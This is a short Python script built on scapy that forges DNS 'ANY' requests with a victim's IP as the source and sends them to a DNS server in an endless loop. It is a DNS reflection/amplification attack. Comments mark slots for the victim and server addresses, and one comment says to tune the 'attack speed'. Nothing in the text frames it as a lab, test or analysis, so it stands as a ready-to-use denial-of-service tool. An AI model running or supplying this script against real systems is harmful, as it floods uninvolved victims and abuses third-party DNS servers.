from scapy.all import *
import random
import time

# Victim and DNS Server IPs
victim_ip = "victim_ip_here"  # Replace with the victim's IP
dns_server_ip = "your_dns_server_ip_here"  # Replace with your DNS server's IP

# Define the DNS request (spoofed to victim IP)
dns_request = IP(src=victim_ip, dst=dns_server_ip) / UDP(dport=53) / DNS(rd=1, qd=DNSQR(qname="example.com", qtype="ANY"))

# Simple loop to send requests every second
while True:
    send(dns_request)
    print(f"Sent spoofed DNS request to {dns_server_ip} targeting {victim_ip}")
    time.sleep(1)  # Adjust time to control attack speed
